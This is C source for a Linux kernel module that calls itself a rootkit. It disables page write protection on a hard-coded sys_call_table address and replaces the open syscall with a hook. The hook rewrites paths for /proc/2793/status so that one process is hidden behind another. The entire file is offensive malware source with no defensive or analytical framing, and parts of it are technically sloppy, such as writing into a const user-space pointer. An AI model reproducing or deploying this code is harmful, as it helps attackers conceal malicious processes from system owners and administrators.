#include<linux/init.h>
#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/errno.h>
#include<linux/types.h>
#include<linux/unistd.h>
#include<asm/current.h>
#include<linux/sched.h>
#include<linux/syscalls.h>
#include<linux/utsname.h>
#include<linux/slab.h>

/*MY sys_call_table address*/
//ffffffff81e001a0

void **system_call_table_addr;

asmlinkage int (*original_open)(const char *pathname, int flags);
 
asmlinkage int open_hijack(const char *pathname, int flags) {
    /*This hooks all  OPEN sys calls and check to see what the path of the file being opened is
    currently, the paths must be hard coded for the process you wish to hide, and the process you would like it to impersonate*/
    if(strstr(pathname, "/proc/2793/status") != NULL) {
        printk(KERN_ALERT "PS PROCESS HIJACKED %s\n", pathname);
    //The new process location will be written into the syscall table for the open command, causing it to open a different file than the one originaly requested
        memcpy(pathname, "/proc/2794/status", strlen(pathname)+1);
    }
 
    return (*original_open)(pathname, flags);
}

//Make syscall table  writeable
int make_rw(unsigned long address){
 
        unsigned int level;
        pte_t *pte = lookup_address(address, &level);
        if(pte->pte &~_PAGE_RW){
                pte->pte |=_PAGE_RW;
        }
        return 0;
}
 
// Make the syscall table  write protected
int make_ro(unsigned long address){
 
        unsigned int level;
        pte_t *pte = lookup_address(address, &level);
        pte->pte = pte->pte &~_PAGE_RW;
        return 0;
}

static int __init rootkit_init(void)
{
    system_call_table_addr = (void*)0xffffffff81e001a0;

   //return the system call to its original state
        original_open = system_call_table_addr[__NR_open];
 
        //Disable page protection
        make_rw((unsigned long)system_call_table_addr);
        system_call_table_addr[__NR_open] = open_hijack;
    return 0;
}

static void __exit rootkit_exit(void){
 
        //restore original system call
        system_call_table_addr[__NR_open] = original_open;
 
        //Enable syscall table  protection
        make_ro((unsigned long)system_call_table_addr);
        printk(KERN_INFO "Unloaded Open psHook successfully\n");
 
        return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);